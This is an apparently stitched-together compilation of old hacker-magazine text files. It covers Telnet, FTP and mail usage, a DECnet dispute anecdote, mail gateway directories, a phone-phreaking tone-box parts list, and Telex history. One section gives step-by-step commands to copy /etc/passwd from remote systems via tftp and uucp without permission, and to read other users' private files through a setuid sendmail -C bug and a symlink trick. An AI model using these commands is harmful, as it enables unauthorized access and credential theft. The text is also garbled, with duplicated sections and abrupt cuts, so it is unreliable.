When you type in the escape character, the Telnet prompt returns to your screen
and you can enter subcommands.  For example, to break the connection, which
usually logs you off the remote host, enter the subcommand "quit":

Telnet> quit

Your Telnet connection usually breaks when you log off the remote host, so the
"quit" subcommand is not usually used to log off.

When you are logged in to a remote computer via Telnet, remember that there is
a time delay between your local computer and the remote one.  This often
becomes apparent to users when scrolling a long file across the terminal screen
nd they wish to cancel the scrolling by typing CONTROL-C or something similar.
After typing the special control character, the scrolling continues.  The
special control character takes a certain amount of time to reach the remote
computer which is still scrolling information.  Thus response from the remote
computer will not likely be as quick as response from a local computer.

Once you are remotely logged on, the computer you are logged on to effectively
becomes your "local computer," even though your original "local computer" still
considers you logged on.  You can log on to a third computer which would then
become your "local computer" and so on.  As you log out of each session, your
previous session becomes active again.


File Transfer
~~~~~~~~~~~~~

FTP is the program that allows files to be sent from one computer to another.
"FTP" stands for "File Transfer Protocol".

When you start using FTP, a communications channel with another computer on the
network is opened.  For example, to start using FTP and initiate a file
transfer session with a computer on the network called "UMCVMB", you would
issue the following subcommand:

FTP UMCVMB.MISSOURI.EDU

Host "UMCVMB" will prompt you for an account name and password.  If your login
is correct, FTP will tell you so, otherwise it will say "login incorrect."  Try
again or abort the FTP program.  (This is usually done by typing a special
control character such as CONTROL-C.  The "program abort" character varies from
system to system.)

Next you will see the FTP prompt, which is:

Ftp>

There are a number of subcommands of FTP.  The subcommand "?" will list these
commands and a brief description of each one.

You can initiate a file transfer in either direction with FTP, either from the
remote host or to the remote host.  The "get" subcommand initiates a file
transfer from the remote host (i.e. Tells the remote computer to send the file
to the local computer [the one on which you issued the "ftp" command]).  Simply
enter "get" and  FTP will prompt you for the remote host's file name and the
(new) local host's file name.  Example:

Ftp> get
Remote file name?
theirfile
local file name?
myfile

ou can abbreviate this by typing both file names on the same line as the "get"
subcommand.  If you do not specify a local file name, the new local file will
be called the same thing as the remote file.  Valid FTP subcommands to get a
file include the following:

get theirfile myfile
get doc.x25

The "put" subcommand works in a similar fashion and is used to send a file from
the local computer to the remote computer.  Enter the command "put" and FTP
will prompt you for the local file name and then the remote file name.  If the
transfer cannot be done because the file doesn't exist or for some other
reason, FTP will print an error message.

There are a number of other subcommands in FTP that allow you to do many more
things.  Not all of these are standard so consult your local documentation or
type a question mark at the FTP prompt.  Some functions often built into FTP
include the ability to look at files before getting or putting them, the
ability to change directories, the ability to delete files on the remote
computer, and the ability to list the directory on the remote host.

An intriguing capability of many FTP implementations is "third party
transfers."  For example, if you are logged on computer A and you want to cause
computer B to send a file to computer C, you can use FTP to connect to computer
B and use the "rmtsend" command.  Of course, you have to know usernames and
passwords on all three computers, since FTP never allows you to peek into
someone's directory and files unless you know their username and password.

The "cd" subcommand changes your working directory on the remote host.  The
"lcd" subcommand changes the directory on the local host.  For UNIX systems,
the meaning of these subcommands is obvious.  Other systems, especially those
that do not have directory-structured file system, may not implement these
commands or may implement them in a different manner.

The "dir" and "ls" subcommands do the same thing, namely list the files in the
working directory of of the remote host.

The "list" subcommand shows the contents of a file without actually putting it
into a file on the local computer.  This would be helpful if you just wanted to
inspect a file.  You could interrupt it before it reached the end of the file
by typing CONTROL-C or some other special character.  This is dependent on your
FTP implementation.

The "delete" command can delete files on the remote host.  You can also make
and remove directories on the remote host with "mkdir" and "rmdir".  The
"status" subcommand will tell you if you are connected and with whom and what
the state of all your options are.

If you are transferring binary files or files with any non-printable
characters, turn binary mode on by entering the "binary" subcommand:

binary

To resume non-binary transfers, enter the "ascii" subcommand.

Transferring a number of files can be done easily by using "mput" (multiple
put) and "mget" (multiple get).  For example, to get every file in a particular
directory, first issue a "cd" command to  change to that directory and then an
"mget" command with an asterisk to indicate every file:

cd somedirectory
mget *

When you are done, use the "close" subcommand to break the communications link.
You will still be in FTP, so you must use the "bye" subcommand to exit FTP and
return to the command level.  The "quit" subcommand will close the connection
and exit from FTP at the same time.


Mail
~~~~
Mail is the simplest network facility to use in many ways.  All you have to do
is to create your message, which can be done with a file editor or on the spur
of the moment, and then send it.  Unlike FTP and Telnet, you do not need to
know the password of the username on the remote computer.  This is so because
you cannot change or access the files of the remote user nor can you use their
account to run programs.  All you can do is to send a message.

There is probably a program on your local computer which does mail between
users on that computer.  Such a program is called a mailer.  This may or may
not be the way to send or receive mail from other computers on the network,
although integrated mailers are more and more common.  UNIX mailers will be
used as an example in this discussion.

Note that the protocol which is used to send and receive mail over a TCP/IP
network is called SMTP, the "Simple Mail Transfer Protocol."  Typically, you
will not use any program called SMTP, but rather your local mail program.

UNIX mailers are usually used by invoking a program named "mail".  To receive
new mail, simply type "mail".

There are several varieties of UNIX mailers in existence.  Consult your local
documentation for details.  For example, the command "man mail" prints out the
manual pages for the mail program on your computer.

To send mail, you usually specify the address of the recipient on the mail
command.  For example: "mail knight@umcvmb.missouri.edu" will send the
following message to username "knight" on host "umcvmb".

You can usually type in your message one line at a time, pressing RETURN after
each line and typing CONTROL-D to end the message. Other facilities to include
already-existing files sometimes exist.  For example, Berkeley UNIXes allow you
to enter commands similar to the following to include a file in your current
mail message:

r myfile

In this example, the contents of "myfile" are inserted into the message at this
point.

Most UNIX systems allow you to send a file through the mail by using input
redirection.  For example:

mail knight@umcvmb.missouri.edu < myfile

In this example, the contents of "myfile" are sent as a message to "knight" on
"umcvmb."

Note that in many UNIX systems the only distinction between mail bound for
another user on the same computer and another user on a remote computer is
simply the address specified.  That is, there is no hostname for local
recipients.  Otherwise, mail functions in exactly the same way.  This is common
for integrated mail packages.  The system knows whether to send the mail
locally or through the network based on the address and the user is shielded
from any other details.

Prologue For None VMS Users
~~~~~~~~~~~~~~~~~~~~~~~~~~~
     DECnet is the network for DEC machines, in most cases you can say VAXes.
DECnet allows you to do:   - e-mail
                           - file transfer
                           - remote login
                           - remote command
                           - remote job entry
                           - PHONE
     PHONE is an interactive communication between users and is equal to TALK
on UNIX or a "deluxe"-CHAT on VM/CMS.

     BELWUE, the university network of the state Baden-Wuerttemberg in
West Germany contains (besides other networks) a DECnet with about 400 VAXes.
On every VAX there is standard-account called DECNET with pw:= DECNET, which is
not reachable via remote login.  This account is provided for several
DECnet-Utilities and as a pseudo-guest-account.  The DECNET-account has very
restricted privileges:  You cannot edit a file or make another remote login.

    The HELP-menu is equipped by the system and is similar to the MAN command
on UNIX.

    More information on DECnet can be found in "Looking Around In DECnet" by
Deep Thought in this very issue of Phrack Inc.
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

     Here, at the University of Ulm, we have an *incredibly* ignorant computer
center staff, with an even bigger lack of system-literature (besides the 80 kg
of VAX/VMS-manuals).  The active may search for information by himself, which
is over the level of "run," "FORTRAN," or "logout."  My good luck that I have
other accounts in the BELWUE-DECnet, where more information is offered for the
users.  I am a regular student in Ulm and all my accounts are completely legal
and corresponding to the German laws.  I don't call myself a "hacker," I feel
more like a "user" (...it's more a defining-problem).

     In the HELP-menu in a host in Tuebingen I found the file netdcl.com and
the corresponding explanation, which sends commands to the DECNET-Account of
other VAXes and executes them there (remote command).  The explanation in the
HELP-menu was idiot-proof -- therefore for me, too :-)

     With the command "$ mcr ncp show known nodes" you can obtain a list of all
netwide active VAXes, as is generally known, and so I pinged all these VAXes to
look for more information for a knowledge-thirsty user.  With "help", "dir" and
other similar commands I look around on those DECnet accounts, always watching
for topics related to the BELWUE-network.  It's a pity, that 2/3 of all VAXes
have locked the DECNET-Account for NETDCL.COM.  Their system managers are
probably afraid of unauthorized access, but I cannot imagine how there could be
such an unauthorized access, because you cannot log on this account -- no
chance for trojan horses, etc.

     Some system managers called me back after I visited their VAX to chat with
me about the network and asked me if they could help me in any way. One sysop
from Stuttgart even sent me a version of NETDCL.COM for the ULTRIX operation
system.

     Then, after a month, the  H O R R O R  came over me in shape of a the
following mail:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
From:   TUEBINGEN::SYSTEM       31-MAY-1989 15:31:11.38
To:     FRAMSTAG
CC:
Subj:   don't make any crap, or you'll be kicked out!

From:   ITTGPX::SYSTEM       29-MAY-1989 16:46
To:     TUEBINGEN::SYSTEM
Subj:   System-breaking-in 01-May-1989

To the system manager of the Computer TUEBINGEN,

On May 1st 1989 we had a System-breaking-in in our DECNET-account, which
started from your machine.  By help of our accounting we ascertained your user
FRAMSTAG to have emulated an interactive log-on on our backbone-node and on
every machine of our VAX-cluster with the "trojan horse" NETDCL.COM.  Give us
this user's name and address and dear up the occurrence completely.  We point
out that the user is punishable.  In case of repetition we would be forced to
take corresponding measures.  We will check whether our system got injured.  If
not, this time we will disregard any measure.  Inform us via DECnet about your
investigation results -- we are attainable by the nodenumber 1084::system

Dipl.-Ing. Michael Hager
--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

     My system manager threatened me with the deleting of my account, if I
would not immediately enlighten the affair.  *Gulp*!
     I was conscious about my innocence, but how to tell it to the others?  I
explained, step by step, everything to my system manager.  He then understood
after a while, but the criminal procedure still hovered over me... so, I took
quickly to my keyboard, to compose file of explanations and to send it to that
angry system manager in Stuttgart (node 1084 is an institute there).  But no
way out:  He had run out of disk quota and my explanation-mail sailed into the
nirwana:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
$ mail explanation
  To:   1084::system
%MAIL-E, error sending to user SYSTEM at 1084
%MAIL-E-OPENOUT, error opening SYS$SYSROOT:[SYSMGR]MAIL$00040092594FD194.MAI;
as output
-RMS-E-CRE, ACP file create failed
-SYSTEM-F-EXDISKQUOTA, disk quota exceeded
--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---

     Also the attempt of a connection with the PHONE-facilty failed:  In his
borderless hacker-paranoia, he cut off his PHONE... and nowhere is a list with
the REAL-addresses of the virtual DECnet-addresses available (to prevent
hacking).  Now I stood there with the brand "DANGEROUS HACKER!" and I had no
chance to vindicate myself.  I poured out my troubles to an acquaintance of
mine, who is a sysop in the computer-center in Freiburg.  He asked other sysops
and managers thru the whole BELWUE-network until someone gave him a telephone
number after a few days -- and that was the right one!

     I phoned to this Hager and told him what I had done with his
DECnet-account and also what NOT.  I wanted to know which crime I had
committed.  He promptly cancelled all of his reproaches, but he did not excuse
his defamous incriminations.  I entreated him to inform my system manager in
Tuebingen that I have done nothing illegal and to stop him from erasing my
account.  This happens already to a fellow student of mine (in this case, Hager
was also guilty).  He promised me that he would officially cancel his
reproaches.

     After over a week this doesn't happen (I'm allowed to use my account
further on).  In return for it, I received a new mail from Hager on another
account of mine:

--- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- --- ---
From:   1084::HAGER         1-JUN-1989 12:51
To:     50180::STUD_11
Subj:   System-breaking-in

On June 1st 1989 you have committed a system-breaking-in on at least one of our
VAXes.  We were able to register this occurrence.  We would be forced to take
further measure if you did not dear up the occurrence completely until June
6th.

Of course the expenses involved would be imposed on you.  Hence enlightenment
must be in your own interest.

We are attainable via DECnet-mail with the address 1084::HAGER or via following
address:

This was the reaction of my attempt: "$ PHONE 1084::SYSTEM".  I have not
answered to this mail.  I AM SICK OF IT!

ACSNET
~~~~~~
Australian Computer Science Network (ACSNET), also known as Oz, has its gateway
through the CSNET node munnari.oz.au and if you cannot directly mail to the
oz.au domain, try either username%munnari.oz.au@UUNET.UU.NET or
munnari!username@UUNET.UU.NET.
 
AT&T MAIL
~~~~~~~~~
AT&T Mail is a mailing service of AT&T, probably what you might call it's
MCI-Mail equivalent.  It is available on the UUCP network as node name attmail
but I've had problems having mail get through.  Apparently, it does cost money
to mail to this service and the surrounding nodes are not willing to pick up
the tab for the ingoing mail, or at least, this has seemingly been the case
thus far.  I believe, though, that perhaps routing to att!attmail!user would
work.
 
AT&T recently announced six new X.400 interconnections between AT&T Mail and
electronic mail services in the U.S., Korea, Sweden, Australia, and Finland.
In the U.S., AT&T Mail is now interconnected with Telenet Communications
Corporation's service, Telemail, allowing users of both services to exchange
messages easily.  With the addition of these interconnections, the AT&T Mail
Gateway 400 Service allows AT&T Mail subscribers to exchange messages with
users of the following electronic messaging systems:
 
Company                    E-Mail Name*            Country
-------                    ------------            -------
TeleDelta                  TeDe 400                Sweden
OTC                        MPS400                  Australia
Telecom-Canada             Envoy100                Canada
DACOM                      DACOM MHS               Korea
P&T-Tele                   MailNet 400             Finland
Helsinki Telephone Co.     ELISA                   Finland
Dialcom                    Dialcom                 USA
Telenet                    Telemail                USA
KDD                        Messavia                Japan
Transpac                   ATLAS400                France
 
The interconnections are based on the X.400 standard, a set of guidelines for
the format, delivery and receipt of electronic messages recommended by an
international standards committee the CCITT.  International X.400 messages
incur a surcharge.  They are:
 
                 To Canada:
                    Per note:            $.05
                    Per message unit:    $.10
 
                 To other international locations:
                    Per note:            $.20
                    Per message unit:    $.50
 
There is no surcharge for X.400 messages within the U.S.  The following are
contacts to speak with about mailing through these mentioned networks.  Other
questions can be directed through AT&T Mail's toll-free number, 1-800-624-5672.

CMR
~~~
Previously known as Intermail, the Commercial Mail Relay (CMR) Service is a
mail relay service between the Internet and three commercial electronic mail
systems:  US Sprint/Telenet, MCI-Mail, and DIALCOM systems (i.e. Compmail,
NSFMAIL, and USDA-MAIL).
 
An important note:  The only requirement for using this mail gateway is that
the work conducted must be DARPA sponsored research and other approved
government business.  Basically, this means that unless you've got some
government-related business, you're not supposed to be using this gateway.
Regardless, it would be very difficult for them to screen everything that goes
through their gateway.  Before I understood the requirements of this gateway, I
was sending to a user of MCI-Mail and was not contacted about any problems with
that communication.  Unfortunately, I mistyped the MCI-Mail address on one of
the letters and that letter ended up getting read by system administrators who
then informed me that I was not to be using that system, as well as the fact
that they would like to bill me for using it.  That was an interesting thought
on their part anyway, but do note that using this service does incur charges.
 
The CMR mailbox address in each system corresponds to the label:
 
          Telemail:  [Intermail/USCISI]TELEMAIL/USA
          MCI-Mail:  Intermail      or      107-8239
          CompMail:  Intermail      or      CMP0817
          NSF-Mail:  Intermail      or      NSF153
         USDA-Mail:  Intermail      or      AGS9999
 
Addressing examples for each e-mail system are as follows:
 
MCIMAIL:
   123-4567             seven digit address
   Everett T. Bowens    person's name (must be unique!)
 
COMPMAIL:
   CMP0123              three letters followed by three or four digits
   S.Cooper             initial, then "." and then last name
   134:CMP0123          domain, then ":" and then combination system and
                        account number
 
NSFMAIL:
   NSF0123              three letters followed by three or four digits
   A.Phillips           initial, then "." and then last name
   157:NSF0123          domain, then ":" and then combination system and
                         account number
 
USDAMAIL:
   AGS0123              three letters followed by three or four digits
   P.Shifter            initial, then "." and then last name
   157:AGS0123          domain, then ":" and then combination system and
                         account number
 
TELEMAIL:
   BARNOC               user (directly on Telemail)
   BARNOC/LODH          user/organization (directly on Telemail)
   [BARNOC/LODH]TELEMAIL/USA
                         [user/organization]system branch/country
 
The following are other Telenet system branches/countries that can be mailed
to:
 
TELEMAIL/USA     NASAMAIL/USA     MAIL/USA            TELEMEMO/AUSTRALIA
TELECOM/CANADA   TOMMAIL/CHILE    TMAILUK/GB          ITALMAIL/ITALY

USDA/USA
 
     Note:  OMNET's ScienceNet is on the Telenet system MAIL/USA and to mail to
it, the format would be [A.MAILBOX/OMNET]MAIL/USA.  The following are available
subdivisions of OMNET:

 NOTE:  You can also mail to username@NASAMAIL.NASA.GOV or
        username@GSFCMAIL.NASA.GOV instead of going through the CMR gateway to
        mail to NASAMAIL or GSFCMAIL.
 
For more information and instructions on how to use CMR, send a message to the
user support group at intermail-request@intermail.isi.edu (you'll get basically
what I've listed plus maybe a bit more).  Please read Chapter 3 of The Future
Transcendent Saga (Limbo to Infinity) for specifics on mailing to these
destination mailing systems.
 
COMPUSERVE
~~~~~~~~~~
CompuServe is well known for its games and conferences.  It does, though, have
mailing capability.  Now, they have developed their own Internet domain, called
COMPUSERVE.COM.  It is relatively new and mail can be routed through either
TUT.CIS.OHIO-STATE.EDU or NORTHWESTERN.ARPA.
 
Example: user%COMPUSERVE.COM@TUT.CIS.OHIO-STATE.EDU or replace
         TUT.CIS.OHIO-STATE.EDU with NORTHWESTERN.ARPA).
 
The CompuServe link appears to be a polled UUCP connection at the gateway
machine.  It is actually managed via a set of shell scripts and a comm utility
called xcomm, which operates via command scripts built on the fly by the shell
scripts during analysis of what jobs exist to go into and out of CompuServe.
 
CompuServe subscriber accounts of the form 7xxxx,yyyy can be addressed as
7xxxx.yyyy@compuserve.com.  CompuServe employees can be addressed by their
usernames in the csi.compuserve.com subdomain.  CIS subscribers write mail to
">inet:user@host.domain" to mail to users on the Wide-Area Networks, where
">gateway:" is CompuServe's internal gateway access syntax.  The gateway
generates fully-RFC-compliant headers.
 
To fully extrapolate -- from the CompuServe side, you would use their EasyPlex
mail system to send mail to someone in BITNET or the Internet.   For example,
to send me mail at my Bitnet id, you would address it to:
 
            INET:C488869%UMCVMB.BITNET@CUNYVM.CUNY.EDU
 
Or to my Internet id:
 
            INET:C488869@UMCVMB.MISSOURI.EDU
 
Now, if you have a BITNET to Internet userid, this is a silly thing to do,
since your connect time to CompuServe costs you money.  However, you can use
this information to let people on CompuServe contact YOU.  CompuServe Customer
Service says that there is no charge to either receive or send a message to the
Internet or BITNET.
 
DASNET
~~~~~~
DASnet is a smaller network that connects to the Wide-Area Networks but charges
for their service.  DASnet subscribers get charged for both mail to users on
other networks AND mail for them from users of other networks.  The following
is a brief description of DASnet, some of which was taken from their
promotional text letter.
 
DASnet allows you to exchange electronic mail with people on more than 20
systems and networks that are interconnected with DASnet.  One of the
drawbacks, though, is that, after being subscribed to these services, you must
then subscribe to DASnet, which is a separate cost.  Members of Wide-Area
networks can subscribe to DASnet too.  Some of the networks and systems
reachable through DASnet include the following:
 
     ABA/net, ATT Mail, BIX (Byte Information eXchange), DASnet Network,
     Dialcom, EIES, EasyLink, Envoy 100, FAX, GeoMail, INET, MCI Mail, NWI,
     PeaceNet/EcoNet, Portal Communications, The Meta Network, The Source,
     Telemail, ATI's Telemail (Japan), Telex, TWICS (Japan), UNISON, UUCP, The
     WELL, and Domains (i.e. ".COM" and ".EDU" etc.).  New systems are added
     all of the time.  As of the writing of this file, Connect, GoverNET,
     MacNET, and The American Institute of Physics PI-MAIL are soon to be
     connected.
 
You can get various accounts on DASnet including:
 
  o  Corporate Accounts -- If your organization wants more than one individual
                           subscription.
  o  Site Subscriptions -- If you want DASnet to link directly to your
                           organization's electronic mail system.
 
To send e-mail through DASnet, you send the message to the DASnet account on
your home system.  You receive e-mail at your mailbox, as you do now.  On the
Wide-Area Networks, you send mail to XB.DAS@STANFORD.BITNET.  On the Subject:
line, you type the DASnet address in brackets and then the username just
outside of them.  The real subject can be expressed after the username
separated by a "!"  (Example:  Subject:  [0756TK]randy!How's Phrack?).
 
The only disadvantage of using DASnet as opposed to Wide-Area networks is the
cost.  Subscription costs as of 3/3/89 cost $4.75 per month or $5.75 per month
for hosts that are outside of the U.S.A.
 
You are also charged for each message that you send.  If you are corresponding
with someone who is not a DASnet subscriber, THEIR MAIL TO YOU is billed to
your account.
 
The following is an abbreviated cost list for mailing to the different services
of DASnet:

  *  The charges given here are to the gateway to the network.  The DASnet
     user is not charged for transmission on the network itself.
 
Subscribers to DASnet get a free DASnet Network Directory as well as a listing
in the directory, and the ability to order optional DASnet services like
auto-porting or DASnet Telex Service which gives you your own Telex number and
answerback for $8.40 a month at this time.

CMR
~~~
Previously known as Intermail, the Commercial Mail Relay (CMR) Service is a
mail relay service between the Internet and three commercial electronic mail
systems:  US Sprint/Telenet, MCI-Mail, and DIALCOM systems (i.e. Compmail,
NSFMAIL, and USDA-MAIL).
 
An important note:  The only requirement for using this mail gateway is that
the work conducted must be DARPA sponsored research and other approved
government business.  Basically, this means that unless you've got some
government-related business, you're not supposed to be using this gateway.
Regardless, it would be very difficult for them to screen everything that goes
through their gateway.  Before I understood the requirements of this gateway, I
was sending to a user of MCI-Mail and was not contacted about any problems with
that communication.  Unfortunately, I mistyped the MCI-Mail address on one of
the letters and that letter ended up getting read by system administrators who
then informed me that I was not to be using that system, as well as the fact
that they would like to bill me for using it.  That was an interesting thought
on their part anyway, but do note that using this service does incur charges.
 
The CMR mailbox address in each system corresponds to the label:
 
          Telemail:  [Intermail/USCISI]TELEMAIL/USA
          MCI-Mail:  Intermail      or      107-8239
          CompMail:  Intermail      or      CMP0817
          NSF-Mail:  Intermail      or      NSF153
         USDA-Mail:  Intermail      or      AGS9999
 
Addressing examples for each e-mail system are as follows:
 
MCIMAIL:
   123-4567             seven digit address
   Everett T. Bowens    person's name (must be unique!)
 
COMPMAIL:
   CMP0123              three letters followed by three or four digits
   S.Cooper             initial, then "." and then last name
   134:CMP0123          domain, then ":" and then combination system and
                        account number
 
NSFMAIL:
   NSF0123              three letters followed by three or four digits
   A.Phillips           initial, then "." and then last name
   157:NSF0123          domain, then ":" and then combination system and
                         account number
 
USDAMAIL:
   AGS0123              three letters followed by three or four digits
   P.Shifter            initial, then "." and then last name
   157:AGS0123          domain, then ":" and then combination system and
                         account number
 
TELEMAIL:
   BARNOC               user (directly on Telemail)
   BARNOC/LODH          user/organization (directly on Telemail)
   [BARNOC/LODH]TELEMAIL/USA
                         [user/organization]system branch/country
 
The following are other Telenet system branches/countries that can be mailed
to:
 
TELEMAIL/USA     NASAMAIL/USA     MAIL/USA            TELEMEMO/AUSTRALIA
TELECOM/CANADA   TOMMAIL/CHILE    TMAILUK/GB          ITALMAIL/ITALY

USDA/USA
 
     Note:  OMNET's ScienceNet is on the Telenet system MAIL/USA and to mail to
it, the format would be [A.MAILBOX/OMNET]MAIL/USA.  The following are available
subdivisions of OMNET:
 
         AIR     Atmospheric Sciences
         EARTH   Solid Earth Sciences

 NOTE:  You can also mail to username@NASAMAIL.NASA.GOV or
        username@GSFCMAIL.NASA.GOV instead of going through the CMR gateway to
        mail to NASAMAIL or GSFCMAIL.
 
For more information and instructions on how to use CMR, send a message to the
user support group at intermail-request@intermail.isi.edu (you'll get basically
what I've listed plus maybe a bit more).  Please read Chapter 3 of The Future
Transcendent Saga (Limbo to Infinity) for specifics on mailing to these
destination mailing systems.
 
COMPUSERVE
~~~~~~~~~~
CompuServe is well known for its games and conferences.  It does, though, have
mailing capability.  Now, they have developed their own Internet domain, called
COMPUSERVE.COM.  It is relatively new and mail can be routed through either
TUT.CIS.OHIO-STATE.EDU or NORTHWESTERN.ARPA.
 
Example: user%COMPUSERVE.COM@TUT.CIS.OHIO-STATE.EDU or replace
         TUT.CIS.OHIO-STATE.EDU with NORTHWESTERN.ARPA).
 
The CompuServe link appears to be a polled UUCP connection at the gateway
machine.  It is actually managed via a set of shell scripts and a comm utility
called xcomm, which operates via command scripts built on the fly by the shell
scripts during analysis of what jobs exist to go into and out of CompuServe.
 
CompuServe subscriber accounts of the form 7xxxx,yyyy can be addressed as
7xxxx.yyyy@compuserve.com.  CompuServe employees can be addressed by their
usernames in the csi.compuserve.com subdomain.  CIS subscribers write mail to
">inet:user@host.domain" to mail to users on the Wide-Area Networks, where
">gateway:" is CompuServe's internal gateway access syntax.  The gateway
generates fully-RFC-compliant headers.
 
To fully extrapolate -- from the CompuServe side, you would use their EasyPlex
mail system to send mail to someone in BITNET or the Internet.   For example,
to send me mail at my Bitnet id, you would address it to:
 
            INET:C488869%UMCVMB.BITNET@CUNYVM.CUNY.EDU
 
Or to my Internet id:
 
            INET:C488869@UMCVMB.MISSOURI.EDU
 
Now, if you have a BITNET to Internet userid, this is a silly thing to do,
since your connect time to CompuServe costs you money.  However, you can use
this information to let people on CompuServe contact YOU.  CompuServe Customer
Service says that there is no charge to either receive or send a message to the
Internet or BITNET.
 
DASNET
~~~~~~
DASnet is a smaller network that connects to the Wide-Area Networks but charges
for their service.  DASnet subscribers get charged for both mail to users on
other networks AND mail for them from users of other networks.  The following
is a brief description of DASnet, some of which was taken from their
promotional text letter.
 
DASnet allows you to exchange electronic mail with people on more than 20
systems and networks that are interconnected with DASnet.  One of the
drawbacks, though, is that, after being subscribed to these services, you must
then subscribe to DASnet, which is a separate cost.  Members of Wide-Area
networks can subscribe to DASnet too.  Some of the networks and systems
reachable through DASnet include the following:
 
     ABA/net, ATT Mail, BIX (Byte Information eXchange), DASnet Network,
     Dialcom, EIES, EasyLink, Envoy 100, FAX, GeoMail, INET, MCI Mail, NWI,
     PeaceNet/EcoNet, Portal Communications, The Meta Network, The Source,
     Telemail, ATI's Telemail (Japan), Telex, TWICS (Japan), UNISON, UUCP, The
     WELL, and Domains (i.e. ".COM" and ".EDU" etc.).  New systems are added
     all of the time.  As of the writing of this file, Connect, GoverNET,
     MacNET, and The American Institute of Physics PI-MAIL are soon to be
     connected.
 
You can get various accounts on DASnet including:
 
  o  Corporate Accounts -- If your organization wants more than one individual
                           subscription.
  o  Site Subscriptions -- If you want DASnet to link directly to your
             SAGE **

Introduction:  After reading the earlier renditions of schematics for the Pearl
               Box, I decided that there was an easier and cheaper way of doing
               the same thing with an IC and parts you probably have just
               laying around the house.
 
 
What Is A Pearl Box and Why Do I Want One?
 
     A Pearl Box is a tone generating device that is used to make a wide range
     of single tones.  Therefore, it would be very easy to modify this basic
     design to make a Blue Box by making 2 Pearl Boxes and joining them
     together in some fashion.
 
     A Pearl Box can be used to create any tone you wish that other boxes may
     not.  It also has a tone sweep option that can be used for numerous things
     like detecting different types of phone tapping devices.
 
 
Parts List:
 
        CD4049 RCA integrated circuit
        .1 uF disk capacitor
        1 uF 16V electrolitic capacitor
        1K resistor
        10M resistor
        1meg pot
        1N914 diode
        Some SPST momentary push-button switches
        1 SPDT toggle switch
        9 Volt battery & clip
        and miscellaneous stuff you should have laying around the house.

There are many ways of getting copies of files from a remote system that you
do not have permission to read or an account on login on to and access them
through.  Many administrators do not even bother to restrict many access
points that you can use.
 
Here are the simplest ways:
 
 
A)  Use uucp(1) [Trivial File Transfer Protocol] to retrieve a copy
    of a file if you are running on an Internet based network.
 
B) Abuse uucp(1) [Unix to Unix Copy Program] to retrieve a copy of a file
   if uucp connections are running on that system.
 
C) Access one of many known security loopholes.
 
 
In the following examples, we will use the passwd file as the file to acquire
since it is a readable file that can be found on most systems that these
attacks are valid on.
 
Method A :
 
1) First start the tftp program:
    Enter the command:
 
 tftp
 
    [You have the following prompt:]
 
 tftp>
 
 
2) The next step is to connect to the system that you wish to retrieve files
    from.  At the tftp, type:
 
 tftp> connect other.system.com
 
 
3) Now request the file you wish to get a copy of (in our case, the
    passwd file /etc/passwd ):
 
 tftp> get /etc/passwd /tmp/passwd
 
    [You should see something that looks like the following:]
 
 Received 185659 bytes in 22 seconds.
 
4) Now exit the tftp program with the "quit" command:
 
 tftp> quit
 
You should now have a copy of other.system.com's passwd file in your directory.
 
NOTE:  Some Unix systems' tftp programs have a different syntax.  The above was
       tested under SunOS 4.0
 
For example, on Apollos, the syntax is:
 
    tftp -{g|g!|p|r|w} <local file> <host> <foreign file> [netascii|image]
 
Thus you must use the command:
 
 tftp -g password_file networked-host /etc/passwd
 
Consult your local "man" pages for more info (or in other words RTFM).
 
At the end of this article, I will include a shell script that will snarf a
password file from a remote host.  To use it type:
 
 gpw system_name
 
Method B :
 
Assuming we are getting the file  /etc/passwd  from the system uusucker, and
our system has a direct uucp connection to that system, it is possible to
request a copy of the file through the uucp links.  The following command will
request that a copy of the passwd file be copied into uucp's home directory
/usr/spool/uucppublic :
 
 uucp -m uusucker!/etc/passwd '>uucp/uusucker_passwd'
 
The flag "-m" means you will be notified by mail when the transfer is
completed.
 
Method C:
 
    The third possible way to access the desired file requires that you have
the login permission to the system.
 
In this case we will utilize a well-known bug in Unix's sendmail daemon.
 
The sendmail program has and option "-C" in which you can specify the
configuration file to use (by default this file is /usr/lib/sendmail.cf or
/etc/sendmail.cf).  It should also be noted that the diagnostics outputted by
sendmail contain the offending lines of text.  Also note that the sendmail
program runs setuid root.
 
The way you can abuse this set of facts (if you have not yet guessed) is by
specifying the file you wish read as the configuration file.  Thus the command:
 
 sendmail -C/usr/accounts/random_joe/private/file
 
Will give you a copy of random joe's private file.
 
Another similar trick is to symlink your .mailcf file to joe's file and mail
someone.  When mail executes sendmail (to send the mail), it will load in your
mailcf and barf out joe's stuff.
 
First, link joe's file to your .mailcf .
 
 ln -s /usr/accounts/random_joe/private/file $HOME/.mailcf
 
Next, send mail to someone.
 
 mail C488869@umcvmb.missouri.edu
 
And have fun.

         "Until a few years ago -- maybe ten -- it was very common to
          see TWX and Telex machines in almost every business place."
 
There were only minor differences between Telex and TWX.  The biggest
difference was that the former was always run by Western Union, while the
latter was run by the Bell System for a number of years.  TWX literally meant
"(T)ype(W)riter e(x)change," and it was Bell's answer to competition from
Western Union.  There were "three row" and "four row" machines, meaning the
number of keys on the keyboard and how they were laid out.  The "three row"
machines were simply part of the regular phone network; that is, they could
dial out and talk to another TWX also connected on regular phone lines.
 
Eventually these were phased out in favor of "newer and more improved" machines
with additional keys, as well as a paper tape reader attachment which allowed
sending the same message repeatedly to many different machines.  These "four
row" machines were not on the regular phone network, but were assigned their
own area codes (410-510-610-710-810-910) where they still remain today.  The
only way a four row machine could call a three row machine or vice-versa was
through a gateway of sorts which translated some of the character set unique to
each machine.
 
Western Union's network was called Telex and in addition to being able to
contact (by dial up) other similar machines, Telex could connect with TWX (and
vice-versa) as well as all the Western Union public offices around the country.
Until the late 1950's or early 1960's, every small town in America had a
Western Union office.  Big cities like Chicago had perhaps a dozen of them, and
they used messengers to hand deliver telegrams around town.  Telegrams could be
placed in person at any public office, or could be called in to the nearest
public office.
 
By arrangement with most telcos, the Western Union office in town nearly always
had the phone number 4321, later supplemented in automated exchanges with some
prefix XXX-4321.  Telegrams could be charged to your home phone bill (this is
still the case in some communities) and from a coin phone, one did not ask for
4321, but rather, called the operator and asked for Western Union.  This was
necessary since once the telegram had been given verbally to the wire clerk,
s/he in turn had to flash the hook and get your operator back on the line to
